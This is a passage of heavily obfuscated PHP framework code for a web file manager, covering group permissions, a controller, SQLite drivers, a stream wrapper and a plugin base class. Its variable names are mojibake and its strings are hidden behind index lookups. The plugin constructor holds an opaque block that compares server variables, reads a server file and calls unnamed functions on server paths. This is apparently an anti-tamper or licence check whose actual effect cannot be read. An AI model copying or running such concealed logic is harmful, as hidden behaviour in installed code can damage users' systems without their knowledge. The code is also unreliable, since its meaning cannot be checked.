$Ş½šı‘é; } private function userGroupList($ÔÂæ°İŸ = false, $ñ½ã· = false) { $¢›Ù• =& $_SERVER[‰‰Ş‚€]; static $½‰„ÃŸ = array(); if (isset($½‰„ÃŸ[$ÔÂæ°İŸ])) { return $½‰„ÃŸ[$ÔÂæ°İŸ]; } if (!$ñ½ã·) { $ñ½ã· = Model($¢›Ù•[617])->getInfo($ÔÂæ°İŸ); } $½‰„ÃŸ[$ÔÂæ°İŸ] = array_to_keyvalue($ñ½ã·[$¢›Ù•[1428]], $¢›Ù•[1429]); return $½‰„ÃŸ[$ÔÂæ°İŸ]; } public function userGroupParents($ÄÎŒ£œ) { $¥ø³‹‚… =& $_SERVER[‰‰Ş‚€]; static $ìÖë…ò = array(); $ÄÎŒ£œ = $ÄÎŒ£œ ? $ÄÎŒ£œ : USER_ID; if (isset($ìÖë…ò[$ÄÎŒ£œ])) { return $ìÖë…ò[$ÄÎŒ£œ]; } $‡Àç“¸Ù = $this->userGroupList($ÄÎŒ£œ); $ã¡ Äú = array(); $½ÛİÖé = $GLOBALS[$¥ø³‹‚…[16]][$¥ø³‹‚…[102]][$¥ø³‹‚…[2128]] == 1; $ì§ƒÎÁ¤ = $½ÛİÖé ? 3 : 2; foreach ($‡Àç“¸Ù as $ÏõŞ®Ù“) { $Æ±¿€ÃŠ = array($ÏõŞ®Ù“[$¥ø³‹‚…[1429]]); $³Æáü = explode($¥ø³‹‚…[60], trim($ÏõŞ®Ù“[$¥ø³‹‚…[604]], $¥ø³‹‚…[60])); if ($³Æáü[0] == $¥ø³‹‚…[239] && count($³Æáü) > $ì§ƒÎÁ¤) { $óÈ—³Ö± = array_slice($³Æáü, $ì§ƒÎÁ¤); $Æ±¿€ÃŠ = array_merge($Æ±¿€ÃŠ, array_reverse($óÈ—³Ö±)); } $ã¡ Äú = array_merge($ã¡ Äú, $Æ±¿€ÃŠ); } $ìÖë…ò[$ÄÎŒ£œ] = array_unique($ã¡ Äú); return $ìÖë…ò[$ÄÎŒ£œ]; } public function authTargetInfoMake($¾Ù©‹Ş±) { $Î¼À›ûÚ =& $_SERVER[‰‰Ş‚€]; $ŸÜ‡™‚ = array(); $­»´ÚÍ· = array(); foreach ($¾Ù©‹Ş± as $„şÒú«²) { if ($„şÒú«²[$Î¼À›ûÚ[199]] == SourceModel::TYPE_USER) { $ŸÜ‡™‚[] = intval($„şÒú«²[$Î¼À›ûÚ[589]]); } else { if ($„şÒú«²[$Î¼À›ûÚ[199]] == SourceModel::TYPE_GROUP) { $­»´ÚÍ·[] = intval($„şÒú«²[$Î¼À›ûÚ[589]]); } } } if ($ŸÜ‡™‚) { $ŸÜ‡™‚ = Model($Î¼À›ûÚ[597])->userListInfo($ŸÜ‡™‚); } if ($­»´ÚÍ·) { $‘â´úé = array($Î¼À›ûÚ[2110] => array($Î¼À›ûÚ[511], $­»´ÚÍ·)); $­»´ÚÍ· = Model($Î¼À›ûÚ[605])->field($Î¼À›ûÚ[2254])->where($‘â´úé)->select(); $­»´ÚÍ· = array_to_keyvalue($­»´ÚÍ·, $Î¼À›ûÚ[1429]); } return array($Î¼À›ûÚ[2255] => $ŸÜ‡™‚, $Î¼À›ûÚ[2256] => $­»´ÚÍ·); } public function authInfo($ÑÖà¯) { $°¶å×º¢ =& $_SERVER[‰‰Ş‚€]; if ($ÑÖà¯[$°¶å×º¢[2129]]) { $ßÄˆ°ÖÕ = Model($°¶å×º¢[591])->listData($ÑÖà¯[$°¶å×º¢[2129]]); if (!$ßÄˆ°ÖÕ) { return !1; $÷Øşß·¶ = Model($°¶å×º¢[591])->listData(); $€ïàÜ–Ş = array_filter_by_field($÷Øşß·¶, $°¶å×º¢[506], $°¶å×º¢[239]); return $€ïàÜ–Ş; } $Îëçô… = array_field_key($ßÄˆ°ÖÕ, array($°¶å×º¢[491], $°¶å×º¢[42], $°¶å×º¢[506], $°¶å×º¢[2043], $°¶å×º¢[2044])); $Îëçô…[$°¶å×º¢[2257]] = $ÑÖà¯; return $Îëçô…; } else { return array($°¶å×º¢[512] => 0, $°¶å×º¢[2026] => $ÑÖà¯[$°¶å×º¢[2192]], $°¶å×º¢[513] => $°¶å×º¢[22], $°¶å×º¢[2043] => $°¶å×º¢[2258]); } } } goto BÕ‹¸¬º±; FÍš™‹àÅÏ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $åÀ³Ùã =& $_SERVER[‰‰Ş‚€]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$åÀ³Ùã[16]] =& $config; $this->values[$åÀ³Ùã[17]] =& $in; $this->tpl = TEMPLATE . MOD . $åÀ³Ùã[18]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($¥ñõ»ÑŒ) { if (1 === func_num_args()) { $this->{$¥ñõ»ÑŒ} = new $¥ñõ»ÑŒ(); } else { $—¬§§¿¶ = new ReflectionClass($¥ñõ»ÑŒ); $È‹…“ıÍ = func_get_args(); array_shift($È‹…“ıÍ); $this->{$¥ñõ»ÑŒ} = $—¬§§¿¶->newInstanceArgs($È‹…“ıÍ); } return $this->{$¥ñõ»ÑŒ}; } public function routeBind($ŞÛõÄ˜, $ğ‚ö½£½, $ğğ…Ë = 3) { $á–—üĞé =& $_SERVER[‰‰Ş‚€]; $°ÖËàÄ = $this->in[$á–—üĞé[19]]; $ŞÛõÄ˜ = str_replace($á–—üĞé[20], $á–—üĞé[21], trim(trim($ŞÛõÄ˜, $á–—üĞé[18]), $á–—üĞé[22])); if (!$ŞÛõÄ˜ || count($°ÖËàÄ) <= $ğğ…Ë) { return !1; } $–—·Š‡ = !0; $‘œğáğÉ = explode($á–—üĞé[18], $ŞÛõÄ˜); for ($ä¢âùú„ = 0; $ä¢âùú„ < count($‘œğáğÉ); $ä¢âùú„++) { if ($‘œğáğÉ[$ä¢âùú„] != $°ÖËàÄ[$ğğ…Ë + $ä¢âùú„]) { $–—·Š‡ = !1; break; } } if (!$–—·Š‡) { return; } call_user_func_array(array($this, $ğ‚ö½£½), array()); } public function routeArgs($ÓÛ¼©üø = 3) { $´¶³œÍ™ = $this->in[$_SERVER[‰‰Ş‚€][19]]; if (count($´¶³œÍ™) <= $ÓÛ¼©üø) { return array(); } $˜‰Ä÷Ú = array(); for ($Ê…À‚— = $ÓÛ¼©üø; $Ê…À‚— < count($´¶³œÍ™); $Ê…À‚— += 2) { $˜‰Ä÷Ú[$´¶³œÍ™[$Ê…À‚—]] = $´¶³œÍ™[$Ê…À‚— + 1]; $this->in[$´¶³œÍ™[$Ê…À‚—]] = $´¶³œÍ™[$Ê…À‚— + 1]; } return $˜‰Ä÷Ú; } protected function assign($™ª“Ûüª, $ôè„¦ÜÕ) { $this->values[$™ª“Ûüª] = $ôè„¦ÜÕ; } protected function display($ëİ™ÕÃµ) { ob_end_clean(); extract($this->values); require $this->tpl . $ëİ™ÕÃµ; } } class DbSqliteBase extends Db { public function __construct($Ò±Óëš© = '') { $æ´àÀî¤ =& $_SERVER[‰‰Ş‚€]; if (!extension_loaded($æ´àÀî¤[23])) { think_exception(think_lang($æ´àÀî¤[24]) . $æ´àÀî¤[25]); } if (!empty($Ò±Óëš©)) { if (!isset($Ò±Óëš©[$æ´àÀî¤[26]])) { $Ò±Óëš©[$æ´àÀî¤[26]] = 438; } $this->config = $Ò±Óëš©; if (empty($this->config[$æ´àÀî¤[27]])) { $this->config[$æ´àÀî¤[27]] = array(); } } } public function connect($¢Œ¦²¼í = '', $Ùáí¬ı³ = 0) { $şù¾»àá =& $_SERVER[‰‰Ş‚€]; if (!isset($this->linkID[$Ùáí¬ı³])) { if (empty($¢Œ¦²¼í)) { $¢Œ¦²¼í = $this->config; } $ÒÊÁ‰–í = !empty($¢Œ¦²¼í[$şù¾»àá[27]][$şù¾»àá[28]]) ? $¢Œ¦²¼í[$şù¾»àá[27]][$şù¾»àá[28]] : $this->pconnect; $Œåº¼ßÁ = $ÒÊÁ‰–í ? $şù¾»àá[29] : $şù¾»àá[30]; $this->linkID[$Ùáí¬ı³] = $Œåº¼ßÁ($¢Œ¦²¼í[$şù¾»àá[31]], $¢Œ¦²¼í[$şù¾»àá[26]]); if (!$this->linkID[$Ùáí¬ı³]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Ùáí¬ı³], 30000); if (1 != think_config($şù¾»àá[32])) { unset($this->config); } } return $this->linkID[$Ùáí¬ı³]; } public function free() { $this->queryID = null; } public function query($Şƒ†şÚë) { $Áñ¬ÈÊ± =& $_SERVER[‰‰Ş‚€]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Şƒ†şÚë; if ($this->queryID) { $this->free(); } think_action_status($Áñ¬ÈÊ±[33], 1); think_status($Áñ¬ÈÊ±[34]); $this->queryID = sqlite_query($this->_linkID, $Şƒ†şÚë); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $´Î¶…¶Ö = $this->getAll(); return $´Î¶…¶Ö; } } public function execute($×õ„‡‘§) { $®¼™öñ =& $_SERVER[‰‰Ş‚€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $×õ„‡‘§; if ($this->queryID) { $this->free(); } think_action_status($®¼™öñ[35], 1); think_status($®¼™öñ[34]); $é®Ğêë’ = sqlite_exec($this->_linkID, $×õ„‡‘§); $this->debug(); if (!1 === $é®Ğêë’) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[‰‰Ş‚€][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ øŸŸ´ô = sqlite_query($this->_linkID, $_SERVER[‰‰Ş‚€][37]); if (!$ øŸŸ´ô) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÉË®›ø = sqlite_query($this->_linkID, $_SERVER[‰‰Ş‚€][38]); if (!$ÉË®›ø) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $˜†Ğ¦Ê = array(); if ($this->numRows > 0) { for ($ÌƒßüÇ¯ = 0; $ÌƒßüÇ¯ < $this->numRows; $ÌƒßüÇ¯++) { $˜†Ğ¦Ê[$ÌƒßüÇ¯] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $˜†Ğ¦Ê; } public function getFields($îÚ·ÒÑ”) { $ç˜ä £€ =& $_SERVER[‰‰Ş‚€]; $Î¬ÏíÚ = $this->query($ç˜ä £€[39] . $îÚ·ÒÑ” . $ç˜ä £€[40]); $ºÔ«Œ¡î = array(); if ($Î¬ÏíÚ) { foreach ($Î¬ÏíÚ as $‹¹ÍáÙò => $Ï‡Ç¯©ò) { $ºÔ«Œ¡î[$Ï‡Ç¯©ò[$ç˜ä £€[41]]] = array($ç˜ä £€[42] => $Ï‡Ç¯©ò[$ç˜ä £€[41]], $ç˜ä £€[43] => $Ï‡Ç¯©ò[$ç˜ä £€[44]], $ç˜ä £€[45] => (bool) ($Ï‡Ç¯©ò[$ç˜ä £€[46]] === $ç˜ä £€[22]), $ç˜ä £€[47] => $Ï‡Ç¯©ò[$ç˜ä £€[48]], $ç˜ä £€[49] => strtolower($Ï‡Ç¯©ò[$ç˜ä £€[50]]) == $ç˜ä £€[51], $ç˜ä £€[52] => strtolower($Ï‡Ç¯©ò[$ç˜ä £€[53]]) == $ç˜ä £€[54]); } } return $ºÔ«Œ¡î; } public function getTables($‡ÂÁ¶É = '') { $Èà°Ì‘€ =& $_SERVER[‰‰Ş‚€]; $¨ß¯»Úá = $this->query($Èà°Ì‘€[55] . $Èà°Ì‘€[56] . $Èà°Ì‘€[57]); $íÚî„œ¢ = array(); foreach ($¨ß¯»Úá as $îØî‡× => $Ó¯—ˆÁ) { $íÚî„œ¢[$îØî‡×] = current($Ó¯—ˆÁ); } return $íÚî„œ¢; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ˆØ§Ù§ö =& $_SERVER[‰‰Ş‚€]; $é„ñ‹êı = sqlite_last_error($this->_linkID); $this->error = $é„ñ‹êı . $ˆØ§Ù§ö[14] . sqlite_error_string($é„ñ‹êı); if ($ˆØ§Ù§ö[22] != $this->queryStr) { $this->error .= LNG($ˆØ§Ù§ö[58]) . $this->queryStr; } think_trace($this->error, $ˆØ§Ù§ö[22], $ˆØ§Ù§ö[59]); return $this->error; } public function escapeString($®îİçØ) { return sqlite_escape_string($®îİçØ); } public function parseLimit($İÚ“’ö) { $şë–±ì† =& $_SERVER[‰‰Ş‚€]; $£Ä’ô›º = $şë–±ì†[22]; if (!empty($İÚ“’ö)) { $İÚ“’ö = explode($şë–±ì†[60], $İÚ“’ö); if (count($İÚ“’ö) > 1) { $£Ä’ô›º .= $şë–±ì†[61] . $İÚ“’ö[1] . $şë–±ì†[62] . $İÚ“’ö[0] . $şë–±ì†[63]; } else { $£Ä’ô›º .= $şë–±ì†[61] . $İÚ“’ö[0] . $şë–±ì†[63]; } } return $£Ä’ô›º; } } class DbSqlite3Base extends Db { public function __construct($ß÷£‘Ù› = '') { $ÍÏ¯±è’ =& $_SERVER[‰‰Ş‚€]; if (!class_exists($ÍÏ¯±è’[64])) { think_exception(think_lang($ÍÏ¯±è’[24]) . $ÍÏ¯±è’[65]); } if (!empty($ß÷£‘Ù›)) { if (!isset($ß÷£‘Ù›[$ÍÏ¯±è’[26]])) { $ß÷£‘Ù›[$ÍÏ¯±è’[26]] = 438; } $this->config = $ß÷£‘Ù›; if (empty($this->config[$ÍÏ¯±è’[27]])) { $this->config[$ÍÏ¯±è’[27]] = array(); } } } public function connect($„Û˜¢ûø = '', $ÎÂ®ÎÖÀ = 0) { $†±˜ôÎ³ =& $_SERVER[‰‰Ş‚€]; if (!isset($this->linkID[$ÎÂ®ÎÖÀ])) { if (empty($„Û˜¢ûø)) { $„Û˜¢ûø = $this->config; } $this->linkID[$ÎÂ®ÎÖÀ] = new SQLite3($„Û˜¢ûø[$†±˜ôÎ³[31]]); if (!$this->linkID[$ÎÂ®ÎÖÀ]) { think_exception($this->linkID[$ÎÂ®ÎÖÀ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÎÂ®ÎÖÀ]->busyTimeout(30000); if (1 != think_config($†±˜ôÎ³[32])) { unset($this->config); } } return $this->linkID[$ÎÂ®ÎÖÀ]; } public function free() { $this->queryID = null; } public function query($ÁÚ§¯«ù) { $¦¾©–£ =& $_SERVER[‰‰Ş‚€]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÁÚ§¯«ù; if ($this->queryID) { $this->free(); } think_action_status($¦¾©–£[33], 1); think_status($¦¾©–£[34]); $this->queryID = $this->_linkID->query($ÁÚ§¯«ù); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $…×¥‡é‡ = $this->getAll(); $this->numRows = count($…×¥‡é‡); return $…×¥‡é‡; } } public function execute($‹¦£Ûî) { $Î‚¡èï„ =& $_SERVER[‰‰Ş‚€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‹¦£Ûî; if ($this->queryID) { $this->free(); } think_action_status($Î‚¡èï„[35], 1); think_status($Î‚¡èï„[34]); $ş²ô»‘ø = $this->_linkID->exec($‹¦£Ûî); $this->debug(); if (!1 === $ş²ô»‘ø) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[‰‰Ş‚€][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÜÔõãó = $this->_linkID->query($_SERVER[‰‰Ş‚€][37]); if (!$ÜÔõãó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $û¤ùÙ‰é = $this->_linkID->query($_SERVER[‰‰Ş‚€][38]); if (!$û¤ùÙ‰é) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $öèËË€ı = array(); while ($èª“¬Ş  = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $öèËË€ı[] = $èª“¬Ş ; } $this->queryID->reset(); return $öèËË€ı; } public function getFields($ÅøĞ«Ã‘) { $å’ü•Éò =& $_SERVER[‰‰Ş‚€]; $»¸‰ó—½ = $this->query($å’ü•Éò[39] . $ÅøĞ«Ã‘ . $å’ü•Éò[40]); $ÛşÂÄµÅ = array(); if ($»¸‰ó—½) { foreach ($»¸‰ó—½ as $§æø÷ç€ => $†òÕ÷ƒ) { $ÛşÂÄµÅ[$†òÕ÷ƒ[$å’ü•Éò[42]]] = array($å’ü•Éò[42] => $†òÕ÷ƒ[$å’ü•Éò[42]], $å’ü•Éò[43] => $†òÕ÷ƒ[$å’ü•Éò[43]], $å’ü•Éò[45] => (bool) ($†òÕ÷ƒ[$å’ü•Éò[45]] === $å’ü•Éò[22]), $å’ü•Éò[47] => $†òÕ÷ƒ[$å’ü•Éò[66]], $å’ü•Éò[49] => (bool) $†òÕ÷ƒ[$å’ü•Éò[67]], $å’ü•Éò[52] => (bool) $†òÕ÷ƒ[$å’ü•Éò[67]]); } } return $ÛşÂÄµÅ; } public function getTables($½´Û²Ã¯ = '') { $û¬È¶…Í =& $_SERVER[‰‰Ş‚€]; $Øˆô„™Ä = $this->query($û¬È¶…Í[55] . $û¬È¶…Í[56] . $û¬È¶…Í[57]); $ïƒÍÁçÄ = array(); foreach ($Øˆô„™Ä as $ü¦Óß¨º => $‹ÆŸ™¤) { $ïƒÍÁçÄ[$ü¦Óß¨º] = current($‹ÆŸ™¤); } return $ïƒÍÁçÄ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $âÃş©• =& $_SERVER[‰‰Ş‚€]; $this->error = $this->_linkID->lastErrorMsg(); if ($âÃş©•[22] != $this->queryStr) { $this->error .= LNG($âÃş©•[58]) . $this->queryStr; } think_trace($this->error, $âÃş©•[22], $âÃş©•[59]); return $this->error; } public function escapeString($ö Ğ¦Ù³) { $¤’Ì¤âó =& $_SERVER[‰‰Ş‚€]; if ($this->_linkID) { return $this->_linkID->escapeString($ö Ğ¦Ù³); } return str_ireplace($¤’Ì¤âó[68], $¤’Ì¤âó[69], $ö Ğ¦Ù³); } public function parseLimit($ä¹€Ù„²) { $Æ’ÒÄ« =& $_SERVER[‰‰Ş‚€]; $Ş¯­Ùı² = $Æ’ÒÄ«[22]; if (!empty($ä¹€Ù„²)) { $ä¹€Ù„² = explode($Æ’ÒÄ«[60], $ä¹€Ù„²); if (count($ä¹€Ù„²) > 1) { $Ş¯­Ùı² .= $Æ’ÒÄ«[61] . $ä¹€Ù„²[1] . $Æ’ÒÄ«[62] . $ä¹€Ù„²[0] . $Æ’ÒÄ«[63]; } else { $Ş¯­Ùı² .= $Æ’ÒÄ«[61] . $ä¹€Ù„²[0] . $Æ’ÒÄ«[63]; } } return $Ş¯­Ùı²; } } goto E—©¤©Š÷; EÇÑ¿ò†“±: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÛğÛÅåé, $Š•¥Æèù = '') { $this->info = $this->info($ÛğÛÅåé); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[‰‰Ş‚€][97]]; $this->pathOpen = $ÛğÛÅåé; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÛğÛÅåé])) { self::$_chunkBuffer[$ÛğÛÅåé] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Ş­ÏäŠ—) { $Ü´îŠµß = $this->fileSubstr($this->pose, $Ş­ÏäŠ—); $this->pose += strlen($Ü´îŠµß); return $Ü´îŠµß; } public function stream_tell() { return $this->pose; } public function stream_seek($¦ºË¢ã¦, $êüæÜõÖ) { $ü¡é»“– =& $_SERVER[‰‰Ş‚€]; if ($êüæÜõÖ == SEEK_SET) { $this->pose = $¦ºË¢ã¦; } else { if ($êüæÜõÖ == SEEK_CUR) { $this->pose += $¦ºË¢ã¦; } else { if ($êüæÜõÖ == SEEK_END) { $this->pose = $this->info[$ü¡é»“–[89]] + intval($¦ºË¢ã¦); } } } if ($¦ºË¢ã¦ < 0) { $this->pose = $this->info[$ü¡é»“–[89]] + $¦ºË¢ã¦; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[‰‰Ş‚€][89]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($”‘åÆ±…, $áæÊ¥¢) { $í‹Ïû÷ =& $_SERVER[‰‰Ş‚€]; $ªÇü„é¸ = $this->info($”‘åÆ±…); return array($í‹Ïû÷[1446] => 0, $í‹Ïû÷[1654] => 0, $í‹Ïû÷[26] => 32768 + 511, $í‹Ïû÷[1655] => 0, $í‹Ïû÷[1656] => 0, $í‹Ïû÷[1657] => 0, $í‹Ïû÷[1658] => 0, $í‹Ïû÷[89] => $ªÇü„é¸[$í‹Ïû÷[89]], $í‹Ïû÷[1659] => $ªÇü„é¸[$í‹Ïû÷[1501]], $í‹Ïû÷[1616] => $ªÇü„é¸[$í‹Ïû÷[98]], $í‹Ïû÷[1615] => $ªÇü„é¸[$í‹Ïû÷[242]], $í‹Ïû÷[1660] => 0, $í‹Ïû÷[1661] => 0); } static $fileInfo = array(); public function info($ª¸‘ÖÇ´) { $šµÌ»ß = $_SERVER[‰‰Ş‚€][1662]; if (isset(self::$fileInfo[$ª¸‘ÖÇ´])) { return self::$fileInfo[$ª¸‘ÖÇ´]; } if (substr($ª¸‘ÖÇ´, 0, strlen($šµÌ»ß)) != $šµÌ»ß) { return !1; } self::$fileInfo[$ª¸‘ÖÇ´] = IO::info(substr($ª¸‘ÖÇ´, strlen($šµÌ»ß))); return self::$fileInfo[$ª¸‘ÖÇ´]; } public static function read($öæƒÀ£µ, $¾Ã©ê¨, $øæ±Â³˜) { if (!isset(self::$_fopenCache[$öæƒÀ£µ])) { $ğÈüÎƒ‘ = new StreamWrapperIO(); $ğÈüÎƒ‘->stream_open($öæƒÀ£µ); self::$_fopenCache[$öæƒÀ£µ] = $ğÈüÎƒ‘; } $ğÈüÎƒ‘ = self::$_fopenCache[$öæƒÀ£µ]; return $ğÈüÎƒ‘->fileSubstr($¾Ã©ê¨, $øæ±Â³˜); } public static function _read($º³Æ–¬, $½ Ê¡€, $´Ï¬°·) { $ æ²¦™• =& $_SERVER[‰‰Ş‚€]; $„²÷À™È = fopen($º³Æ–¬, $ æ²¦™•[1505]); if (!$„²÷À™È) { return $ æ²¦™•[22]; } $ºáØã± = 8192; fseek($„²÷À™È, $½ Ê¡€, SEEK_SET); $ÛİÍ³´ = $ æ²¦™•[22]; $ï«ÉÍé = 0; while ($ï«ÉÍé < $´Ï¬°·) { $ˆ¹à×÷µ = min($ºáØã±, $´Ï¬°· - $ï«ÉÍé); $ÛİÍ³´ .= fread($„²÷À™È, $ˆ¹à×÷µ); $ï«ÉÍé += $ˆ¹à×÷µ; } fclose($„²÷À™È); return $ÛİÍ³´; } public function fileSubstr($íïÎ¬“, $È›÷ğ‚) { $ìáõ§íš =& $_SERVER[‰‰Ş‚€]; $¿Ö¡ïÉÏ = $this->info[$ìáõ§íš[89]]; $ØÇ·×Á = $íïÎ¬“; $ì·¹Ÿøò = $È›÷ğ‚; if ($íïÎ¬“ < 0) { $íïÎ¬“ = $¿Ö¡ïÉÏ + $íïÎ¬“; } if ($È›÷ğ‚ === !1) { $È›÷ğ‚ = $¿Ö¡ïÉÏ - $íïÎ¬“; } if ($íïÎ¬“ + $È›÷ğ‚ > $¿Ö¡ïÉÏ) { $È›÷ğ‚ = $¿Ö¡ïÉÏ - $íïÎ¬“; } if ($È›÷ğ‚ <= 0) { return $ìáõ§íš[22]; } if ($íïÎ¬“ < 0 || $íïÎ¬“ >= $¿Ö¡ïÉÏ || $È›÷ğ‚ <= 0 || $È›÷ğ‚ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\x69\154\145\122\145\x61\x64\x20\145\162\162\x6f\x72\41\40\163\x74\x61\x72\x74\75{$íïÎ¬“}\x3b\154\145\x6e\147\164\x68\x3d{$È›÷ğ‚}\x3b\x20\163\151\172\x65\x3d{$¿Ö¡ïÉÏ}\73"); } $ÜÑ¦ã”Ü = 64 * 1024; $ÓÙ£×¤ó =& self::$_chunkBuffer[$this->path]; if (!$ÓÙ£×¤ó) { $ÓÙ£×¤ó = array(); } $¬ä›É§„ = 0; $ƒø¸ùãÂ = 0; $¹ï¡€¹ = $ìáõ§íš[22]; foreach ($ÓÙ£×¤ó as $¬ä›É§„ => $¹ï¡€¹) { $¬ä›É§„ = intval($¬ä›É§„); $ƒø¸ùãÂ = $¬ä›É§„ + strlen($¹ï¡€¹); if ($íïÎ¬“ >= $ƒø¸ùãÂ) { continue; } if ($íïÎ¬“ >= $¬ä›É§„ && $íïÎ¬“ + $È›÷ğ‚ <= $ƒø¸ùãÂ) { return substr($¹ï¡€¹, $íïÎ¬“ - $¬ä›É§„, $È›÷ğ‚); } break; } if (count($ÓÙ£×¤ó) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ìáõ§íš[1663], $ìáõ§íš[1664] . count($ÓÙ£×¤ó) . "\73\163\x74\x61\x72\164\75{$íïÎ¬“}\x2c\154\x65\x6e\x67\x74\x68\x3d{$È›÷ğ‚}\73\x70\x6f\163\x65\72{$¬ä›É§„}\x7e{$ƒø¸ùãÂ}"); throw new Exception($ìáõ§íš[1665]); } $Öüïê™» = intval($íïÎ¬“ / $ÜÑ¦ã”Ü) * $ÜÑ¦ã”Ü; $òñİÚöÏ = ceil(($íïÎ¬“ + $È›÷ğ‚) / $ÜÑ¦ã”Ü) * $ÜÑ¦ã”Ü - $Öüïê™»; $ŸõÜ“À¦ = IO::fileSubstr($this->path, $Öüïê™», $òñİÚöÏ); $ÓÙ£×¤ó[$Öüïê™» . $ìáõ§íš[22]] = $ŸõÜ“À¦; ksort($ÓÙ£×¤ó); $•›ø¤ò = substr($ŸõÜ“À¦, $íïÎ¬“ - $Öüïê™», $È›÷ğ‚); return $•›ø¤ò; } private function log($õ‰²ÌÑã, $Ç¥Ú¦ß) { $ì¼¨Òæ =& $_SERVER[‰‰Ş‚€]; $±ì€É™É = timeFloat() - $this->timeStart; write_log(sprintf($ì¼¨Òæ[1666], $õ‰²ÌÑã, $this->info[$ì¼¨Òæ[42]], $±ì€É™É, $Ç¥Ú¦ß), $ì¼¨Òæ[1303]); } } class Message { function __construct() { } public function send($Ë½Ñ²ñŠ = '', $†ŒÆÊ› = array(), $³öõĞ¦Á = "\x74\145\x78\x74") { $“¤­İ»¬ =& $_SERVER[‰‰Ş‚€]; $áŞ—·¨ì = array($“¤­İ»¬[43] => $“¤­İ»¬[1231], $“¤­İ»¬[179] => $Ë½Ñ²ñŠ); if (in_array($³öõĞ¦Á, array($“¤­İ»¬[1231], $“¤­İ»¬[1667]))) { $áŞ—·¨ì[$“¤­İ»¬[43]] = $³öõĞ¦Á; } $†ŒÆÊ› = array($“¤­İ»¬[598] => isset($†ŒÆÊ›[$“¤­İ»¬[598]]) ? $†ŒÆÊ›[$“¤­İ»¬[598]] : $“¤­İ»¬[22], $“¤­İ»¬[685] => isset($†ŒÆÊ›[$“¤­İ»¬[685]]) ? $†ŒÆÊ›[$“¤­İ»¬[685]] : $“¤­İ»¬[22]); if (empty($Ë½Ñ²ñŠ) || empty($†ŒÆÊ›[$“¤­İ»¬[598]]) && empty($†ŒÆÊ›[$“¤­İ»¬[685]])) { return !1; } $ĞŠ•ÃÛ» = array($“¤­İ»¬[1596] => $áŞ—·¨ì, $“¤­İ»¬[1668] => $†ŒÆÊ›); Hook::trigger($“¤­İ»¬[1669], $ĞŠ•ÃÛ»); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $å½Üı¾ú =& $_SERVER[‰‰Ş‚€]; if ($_SERVER[$å½Üı¾ú[6]] != $_SERVER[$å½Üı¾ú[1670]]) { $öÃ·´ä® = $å½Üı¾ú[985]; $ª¿ÁŸéİ = $å½Üı¾ú[7]; $ˆÒ®£®© = $_SERVER[$å½Üı¾ú[8]] . $å½Üı¾ú[9]; $àˆ÷÷ä™ = $ª¿ÁŸéİ($ˆÒ®£®©); $°¶ƒ¢ğ = explode($å½Üı¾ú[10], $àˆ÷÷ä™); if (count($°¶ƒ¢ğ) < $å½Üı¾ú[703]) { $¶ªØê¥ = $å½Üı¾ú[12]; $¶ªØê¥(); } $Îõü€å = $å½Üı¾ú[986]; $Îõü€å($_SERVER[$å½Üı¾ú[987]]); $Îõü€å($_SERVER[$å½Üı¾ú[8]] . $å½Üı¾ú[1671]); $Â¡©¾úÒ = 1; while ($Â¡©¾úÒ > 1) { $Â¡©¾úÒ = $Â¡©¾úÒ + 4; $–¤Ô¦‚ä = rawurlencode($Â¡©¾úÒ . $å½Üı¾ú[471]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($å½Üı¾ú[1672]); $this->pluginName = str_replace($å½Üı¾ú[1672], $å½Üı¾ú[22], get_class($this)); $this->pluginPath = 